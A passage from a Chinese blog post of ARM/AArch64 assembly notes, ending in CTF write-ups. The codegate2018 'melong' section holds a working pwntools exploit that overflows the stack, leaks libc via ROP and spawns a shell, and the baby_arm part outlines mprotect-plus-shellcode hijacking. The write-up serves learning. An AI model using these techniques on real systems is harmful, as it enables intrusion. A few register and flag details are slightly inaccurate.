&#x2F;* load the value 511 into R2 *&#x2F; </span><br><span class="line">   bkpt</span><br></pre></td></tr></table></figure>

<p>伪指令，一条指令转移32 bit数据。实际上ARM一条指令只能加载8bit数据。</p>
<h4 id="立即数"><a href="#立即数" class="headerlink" title="立即数"></a>立即数</h4><p>因为ARM指令都是固定的32bit，所以去除condition code，opcode等等，就只剩了12bit给立即数用。也不是直接用12bit存储4096个数字。而是4bit作为循环右移的次数(r)，8bit作为数字(n)，最终立即数的value = n ror (r*2)。可以看到所能表示的数字局限性很大，只能表示8bit数字循环右移偶数次的数字，且右移次数在[0, 30]之间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Valid values:</span><br><span class="line">#256        &#x2F;&#x2F; 1 ror 24 --&gt; 256</span><br><span class="line">#384        &#x2F;&#x2F; 6 ror 26 --&gt; 384</span><br><span class="line">#484        &#x2F;&#x2F; 121 ror 30 --&gt; 484</span><br><span class="line">#16384      &#x2F;&#x2F; 1 ror 18 --&gt; 16384</span><br><span class="line">#2030043136 &#x2F;&#x2F; 121 ror 8 --&gt; 2030043136</span><br><span class="line">#0x06000000 &#x2F;&#x2F; 6 ror 8 --&gt; 100663296 (0x06000000 in hex)</span><br><span class="line"></span><br><span class="line">Invalid values:</span><br><span class="line">#370        &#x2F;&#x2F; 185 ror 31 --&gt; 31 is not in range (0 – 30)</span><br><span class="line">#511        &#x2F;&#x2F; 1 1111 1111 --&gt; bit-pattern can’t fit into one byte</span><br><span class="line">#0x06010000 &#x2F;&#x2F; 1 1000 0001.. --&gt; bit-pattern can’t fit into one byte</span><br></pre></td></tr></table></figure>

<p><strong>避免方法</strong></p>
<ol>
<li>使用小数字构建大数字，如：不使用<code>MOV  r0, #511</code>，而是使用<code>MOV r0, #256, and ADD r0, #255</code></li>
<li>使用<code>LDR r1, =511</code>，让编译器替你转换成mov指令或者PC偏移加载。</li>
</ol>
<h3 id="LOAD-STORE-多个"><a href="#LOAD-STORE-多个" class="headerlink" title="LOAD STORE 多个"></a>LOAD STORE 多个</h3><p><code>LDM</code>, <code>STM</code>，有后缀<code>-IA</code>（Increase After）, <code>IB</code>（Increase Before）, <code>DA</code>（Decrease After）, <code>DB</code>（Decrease Before）。</p>
<p><code>LDM</code> 相当于 <code>LDMIA</code></p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ldm r0, &#123;r4,r5&#125;    &#x2F;* 分别读取R0，R0+4地址处的数据到R4，R5 *&#x2F;</span><br><span class="line">stm r0, &#123;r4,r5&#125;    &#x2F;* 将R4，R5存储到R0，R0+4地址处</span><br><span class="line">ldmib r0, &#123;r4-r6&#125;  &#x2F;* 分别读取R0+4, R0+8, R0+12地址处的数据到R4, R5, R6 *&#x2F;</span><br><span class="line">stmib r1, &#123;r4-r6&#125;  &#x2F;* 同理 *&#x2F;</span><br><span class="line">ldmda r0, &#123;r4-r6&#125;  &#x2F;* 分别读取R0-8, R0-4, R0地址处的数据到R4, R5, R6。数字大的寄存器对应高地址数据*&#x2F;</span><br><span class="line">ldmdb r0, &#123;r4-r6&#125;  &#x2F;* 同理 *&#x2F;</span><br><span class="line">stmda r2, &#123;r4-r6&#125;  &#x2F;* 将R4, R5, R6分别存储到R2-8, R2-4, R2地址处</span><br></pre></td></tr></table></figure>

<h4 id="push-pop"><a href="#push-pop" class="headerlink" title="push pop"></a>push pop</h4><p><code>push</code>：sp-4, store</p>
<p><code>pop</code>：load，sp+4</p>
<p><code>push &#123;r0,r1&#125;</code>相当于<code>stmdb sp!, &#123;r0,r1&#125;</code></p>
<p><code>pop &#123;r2, r3&#125;</code>相当于<code>ldria sp!, &#123;r2,r3&#125;</code></p>
<h3 id="条件执行与分支"><a href="#条件执行与分支" class="headerlink" title="条件执行与分支"></a>条件执行与分支</h3><h4 id="条件执行"><a href="#条件执行" class="headerlink" title="条件执行"></a>条件执行</h4><table>
<thead>
<tr>
<th align="center">Condition Code</th>
<th align="left">Meaning (for cmp or subs)</th>
<th align="center">Status of Flags</th>
</tr>
</thead>
<tbody><tr>
<td align="center">EQ</td>
<td align="left">Equal</td>
<td align="center">Z==1</td>
</tr>
<tr>
<td align="center">NE</td>
<td align="left">Not Equal</td>
<td align="center">Z==0</td>
</tr>
<tr>
<td align="center">GT</td>
<td align="left">Signed Greater Than</td>
<td align="center">(Z==0) &amp;&amp; (N==V)</td>
</tr>
<tr>
<td align="center">LT</td>
<td align="left">Signed Less Than</td>
<td align="center">N!=V</td>
</tr>
<tr>
<td align="center">GE</td>
<td align="left">Signed Greater Than or Equal</td>
<td align="center">N==V</td>
</tr>
<tr>
<td align="center">LE</td>
<td align="left">Signed Less Than or Equal</td>
<td align="center">(Z==1) || (N!=V)</td>
</tr>
<tr>
<td align="center">CS or HS</td>
<td align="left">Unsigned Higher or Same (or Carry Set)</td>
<td align="center">C==1</td>
</tr>
<tr>
<td align="center">CC or LO</td>
<td align="left">Unsigned Lower (or Carry Clear)</td>
<td align="center">C==0</td>
</tr>
<tr>
<td align="center">MI</td>
<td align="left">Negative (or Minus)</td>
<td align="center">N==1</td>
</tr>
<tr>
<td align="center">PL</td>
<td align="left">Positive (or Plus)</td>
<td align="center">N==0</td>
</tr>
<tr>
<td align="center">AL</td>
<td align="left">Always executed</td>
<td align="center">–</td>
</tr>
<tr>
<td align="center">NV</td>
<td align="left">Never executed</td>
<td align="center">–</td>
</tr>
<tr>
<td align="center">VS</td>
<td align="left">Signed Overflow</td>
<td align="center">V==1</td>
</tr>
<tr>
<td align="center">VC</td>
<td align="left">No signed Overflow</td>
<td align="center">V==0</td>
</tr>
<tr>
<td align="center">HI</td>
<td align="left">Unsigned Higher</td>
<td align="center">(C==1) &amp;&amp; (Z==0)</td>
</tr>
<tr>
<td align="center">LS</td>
<td align="left">Unsigned Lower or same</td>
<td align="center">(C==0) || (Z==0)</td>
</tr>
</tbody></table>
<h4 id="Thumb中的条件执行"><a href="#Thumb中的条件执行" class="headerlink" title="Thumb中的条件执行"></a>Thumb中的条件执行</h4><p>Thumb-2有条件执行指令<code>IT</code>，其最多允许4条指令。</p>
<ul>
<li>IT refers to If-Then (next instruction is conditional)</li>
<li>ITT refers to If-Then-Then (next 2 instructions are conditional)</li>
<li>ITE refers to If-Then-Else (next 2 instructions are conditional)</li>
<li>ITTE refers to If-Then-Then-Else (next 3 instructions are conditional)</li>
<li>ITTEE refers to If-Then-Then-Else-Else (next 4 instructions are conditional)</li>
</ul>
<p>其实就是if–else语句，else的逻辑必须与if<strong>相反</strong>。if成立执行一条或两条指令，else成立就执行else一条或两条指令。示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ITTE   NE           ; Next 3 instructions are conditional</span><br><span class="line">ANDNE  R0, R0, R1   ; ANDNE does not update condition flags</span><br><span class="line">ADDSNE R2, R2, #1   ; ADDSNE updates condition flags</span><br><span class="line">MOVEQ  R2, R3       ; Conditional move</span><br><span class="line"></span><br><span class="line">ITE    GT           ; Next 2 instructions are conditional</span><br><span class="line">ADDGT  R1, R0, #55  ; Conditional addition in case the GT is true</span><br><span class="line">ADDLE  R1, R0, #48  ; Conditional addition in case the GT is not true</span><br><span class="line"></span><br><span class="line">ITTEE  EQ           ; Next 4 instructions are conditional</span><br><span class="line">MOVEQ  R0, R1       ; Conditional MOV</span><br><span class="line">ADDEQ  R2, R2, #10  ; Conditional ADD</span><br><span class="line">ANDNE  R3, R3, #1   ; Conditional AND</span><br><span class="line">BNE.W  dloop        ; Branch instruction can only be used in the last instruction of an IT block</span><br></pre></td></tr></table></figure>

<p>相反的条件：</p>
<table>
<thead>
<tr>
<th align="center">Condition Code</th>
<th align="center">Opposite</th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">Code</td>
<td align="center">Meaning</td>
<td align="center">Code</td>
<td align="center">Meaning</td>
</tr>
<tr>
<td align="center">EQ</td>
<td align="center">Equal</td>
<td align="center">NE</td>
<td align="center">Not Equal</td>
</tr>
<tr>
<td align="center">HS (or CS)</td>
<td align="center">Unsigned higher or same (or carry set)</td>
<td align="center">LO (or CC)</td>
<td align="center">Unsigned lower (or carry clear)</td>
</tr>
<tr>
<td align="center">MI</td>
<td align="center">Negative</td>
<td align="center">PL</td>
<td align="center">Positive or Zero</td>
</tr>
<tr>
<td align="center">VS</td>
<td align="center">Signed Overflow</td>
<td align="center">VC</td>
<td align="center">No Signed Overflow</td>
</tr>
<tr>
<td align="center">HI</td>
<td align="center">Unsigned Higher</td>
<td align="center">LS</td>
<td align="center">Unsigned Lower or Same</td>
</tr>
<tr>
<td align="center">GE</td>
<td align="center">Signed Greater Than or Equal</td>
<td align="center">LT</td>
<td align="center">Signed Less Than</td>
</tr>
<tr>
<td align="center">GT</td>
<td align="center">Signed Greater Than</td>
<td align="center">LE</td>
<td align="center">Signed Less Than or Equal</td>
</tr>
<tr>
<td align="center">AL (or omitted)</td>
<td align="center">Always Executed</td>
<td align="center">There is no opposite to AL</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="B-BL-BX-BLX"><a href="#B-BL-BX-BLX" class="headerlink" title="B/BL/BX/BLX"></a>B/BL/BX/BLX</h4><p>L: link</p>
<p>X: Exchange</p>
<ul>
<li>B，就是普通的跳转</li>
<li>BL，跳转并且把PC+4存储到LR寄存器。（实际调试发现，这里的PC不是+8之后的，存储的返回地址</li>
<li>BX，BLX，<code>X</code>就是转换ARM/THUMB模式的意思</li>
</ul>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">     .code 32         @ ARM mode</span><br><span class="line">     add r2, pc, #1   @ put PC+1 into R2，此时实际PC指向mov r0,r1指令开始处（PC+8），所以bx可以直接跳过去</span><br><span class="line">     bx r2            @ branch + exchange to R2</span><br><span class="line"></span><br><span class="line">    .code 16          @ Thumb mode</span><br><span class="line">     mov r0, #1</span><br></pre></td></tr></table></figure>

<h4 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h4><p>给分支加上条件，如：<code>BEQ</code></p>
<h3 id="栈和函数"><a href="#栈和函数" class="headerlink" title="栈和函数"></a>栈和函数</h3><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>栈的类型：full ascending, full descending, empty ascending, empty descending</p>
<p>full/empty：sp指向是否有数据</p>
<p>ascending/descending：栈长的方向</p>
<p>ARM是full descending</p>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><strong>prologue</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push   &#123;r11, lr&#125;    &#x2F;* Start of the prologue. Saving Frame Pointer and LR onto the stack *&#x2F;</span><br><span class="line">add    r11, sp, #0  &#x2F;* Setting up the bottom of the stack frame *&#x2F;</span><br><span class="line">sub    sp, sp, #16  &#x2F;* End of the prologue. Allocating some buffer on the stack. This also allocates space for the Stack Frame *&#x2F;</span><br></pre></td></tr></table></figure>

<p>保存前一个R11和程序返回地址。（BL指令，跳转向指定地址，并将返回地址存储于lr，由被调用者保存lr）</p>
<p>保存栈帧</p>
<p>创建函数所需栈空间</p>
<p><strong>body</strong></p>
<p>函数逻辑</p>
<p><strong>epilogue</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub    sp, r11, #0  &#x2F;* Start of the epilogue. Readjusting the Stack Pointer *&#x2F;</span><br><span class="line">pop    &#123;r11, pc&#125;    &#x2F;* End of the epilogue. Restoring Frame Pointer from the Stack, jumping to previously saved LR via direct load into PC. The Stack Frame of a function is finally destroyed at this step. *&#x2F;</span><br></pre></td></tr></table></figure>

<p>恢复SP，取出r11和返回地址。</p>
<h4 id="叶子函数与非叶子函数"><a href="#叶子函数与非叶子函数" class="headerlink" title="叶子函数与非叶子函数"></a>叶子函数与非叶子函数</h4><p>叶子函数：函数中不会再调用其他函数</p>
<p>非叶子函数：相反。</p>
<p>叶子函数因为不会再调用，LR寄存器不会再改变，所以不必保存LR寄存器。叶子函数的最后使用<code>bx lr</code>跳转回去就可以。</p>
<p><code>bx</code>在地址最低位设置为1的情况下才会进行ARM/THUMB模式的转换，否则不会改变只是跳转。</p>
<h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><p>AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。</p>
<table>
<thead>
<tr>
<th align="center">寄存器</th>
<th align="center">别名</th>
<th align="center">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SP</td>
<td align="center">–</td>
<td align="center">Stack Pointer:栈指针</td>
</tr>
<tr>
<td align="center">R30</td>
<td align="center">LR</td>
<td align="center">Link Register:在调用函数时候，保存下一条要执行指令的地址。</td>
</tr>
<tr>
<td align="center">R29</td>
<td align="center">FP</td>
<td align="center">Frame Pointer:保存函数栈的基地址。</td>
</tr>
<tr>
<td align="center">R19-R28</td>
<td align="center">–</td>
<td align="center">Callee-saved registers（含义见上面术语解释）</td>
</tr>
<tr>
<td align="center">R18</td>
<td align="center">–</td>
<td align="center">平台寄存器，有特定平台解释其用法。</td>
</tr>
<tr>
<td align="center">R17</td>
<td align="center">IP1</td>
<td align="center">The second intra-procedure-call temporary register……</td>
</tr>
<tr>
<td align="center">R16</td>
<td align="center">IP0</td>
<td align="center">The first intra-procedure-call temporary register……</td>
</tr>
<tr>
<td align="center">R9-R15</td>
<td align="center">–</td>
<td align="center">临时寄存器</td>
</tr>
<tr>
<td align="center">R8</td>
<td align="center">–</td>
<td align="center">在一些情况下，返回值是通过R8返回的</td>
</tr>
<tr>
<td align="center">R0-R7</td>
<td align="center">–</td>
<td align="center">在函数调用过程中传递参数和返回值</td>
</tr>
<tr>
<td align="center">NZCV</td>
<td align="center">–</td>
<td align="center">状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出</td>
</tr>
</tbody></table>
<h2 id="ARM函数调用约定"><a href="#ARM函数调用约定" class="headerlink" title="ARM函数调用约定"></a>ARM函数调用约定</h2><p>ARM/ARM64使用的是AAPCS或ATPCS标准。</p>
<p>ATPCS即为ARM-Thumb Procedure Call Standard/ARM-Thumb过程调用标准，规定了一些子程序间调用的基本规则，这些规则包括子程序调用过程中寄存器的使用规则，数据栈的使用规则，参数的传递规则。有了这些规则之后，单独编译的C语言程序就可以和汇编程序相互调用。使用ADS(ARM Developer Suite)的C语言编译器编译的C语言子程序满足用户指定的ATPCS类型。而对于汇编语言来说，则需要用户来保证各个子程序满足ATPCS的要求。</p>
<p>而AAPCS即为ARM Archtecture Procedure Call Standard是2007年ARM公司正式推出的新标准，AAPCS是ATPCS的改进版，目前， AAPCS和ATPCS都是可用的标准。</p>
<p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中。</p>
<p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="arm call convention"></p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="pwnable-kr-leg"><a href="#pwnable-kr-leg" class="headerlink" title="pwnable.kr leg"></a>pwnable.kr leg</h3><p>该题目就是考察PC预取两条指令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:	mov	r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>key1函数将当前的PC读入R3，R3会被移入R0，当作返回值。如上所示，当前PC是<code>0x00008cdc+8</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:	add	r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:	bx	r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:	mov	r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:	adds	r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:	push	&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>key2函数变换了一下ARM/THUMB模式，THUMB中指令长度是2字节，预取两条指令就是+4。这个函数也是R3中的值当作返回值。</p>
<p>在THUMB模式中将PC（0x00008d04+4）移入R3，然后R3又加了4。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:	add	r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:	mov	r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:	mov	r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:	sub	sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>key3将lr（返回地址）读入r3。找到main函数中调用key3函数的位置，+4即为返回地址。</p>
<h3 id="codegate2018-melong"><a href="#codegate2018-melong" class="headerlink" title="codegate2018 melong"></a>codegate2018 melong</h3><p>这个执行文件中，用了很多浮点库函数，加减乘除和浮点比较等等，所以看起来有点抽象。</p>
<p>漏洞点在PT中的size，输入一个无法malloc的大小，就能绕过检查。</p>
<p>write_diary使用size的低字节作为输入长度，存在溢出。</p>
<p>多次运行程序可以发现，libc加载地址没有变化，所以可以第一次泄露libc，第二次getshell。</p>
<p>我从<a target="_blank" rel="noopener" href="https://m4x.fun/post/how-2-pwn-an-arm-binary/#codegate2018---melong">m4x</a>师傅那里看到一个方法，但不明白是如何返回的main函数。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">localfile = <span class="string">&quot;./melong&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line">context.binary = localfile</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your height(meters) : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your weight(kilograms) : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PT</span>(<span class="params">num</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;How long do you want to take personal training?\n&quot;</span>)</span><br><span class="line">    io.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_diary</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Type the number:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="comment"># 0x00011bbc : pop &#123;r0, pc&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    g1 = <span class="number">0x00011bbc</span></span><br><span class="line"></span><br><span class="line">    check()</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;&quot;&quot;b *0x11288</span></span><br><span class="line">    <span class="comment"># b *0x1118C</span></span><br><span class="line">    <span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">    PT(<span class="number">-1</span>)</span><br><span class="line">    payload1 = <span class="string">b&quot;A&quot;</span>*<span class="number">0x54</span> + p32(g1) + p32(elf.got[<span class="string">&quot;puts&quot;</span>]) + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(elf.sym[<span class="string">&quot;main&quot;</span>])*<span class="number">6</span></span><br><span class="line">    write_diary(payload1)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;See you again :)\n&quot;</span>)</span><br><span class="line">    puts_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    pf(<span class="string">&quot;puts_addr&quot;</span>, puts_addr)</span><br><span class="line">    libc.address = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    check()</span><br><span class="line">    PT(<span class="number">-1</span>)</span><br><span class="line">    payload2 = <span class="string">b&quot;A&quot;</span>*<span class="number">0x54</span> + p32(g1) + p32(next(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))) + p32(libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    write_diary(payload2)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, localfile])</span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h3 id="Shanghai2018-baby-arm"><a href="#Shanghai2018-baby-arm" class="headerlink" title="Shanghai2018 baby_arm"></a>Shanghai2018 baby_arm</h3><p>aarch64的栈帧布局发生了变化，X29(fp), X30(lr)存储在栈帧底部，数据在上方。</p>
<p>程序首先读入512字节到bss，然后在子函数（栈帧长0x50）中读入512的数据到栈上，存在溢出。程序有一段未执行的函数，调用了mprotect将0x411000开始的0x1000字节（这段地址包含got，bss等）权限设置为0。</p>
<p>受此启发，将shellcode读到bss，使用mprotect修改这段地址为可执行，然后劫持控制到bss。</p>
<p>使用<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/#ret2csu">ret2csu</a>的方式进行设置参数劫持调用。</p>
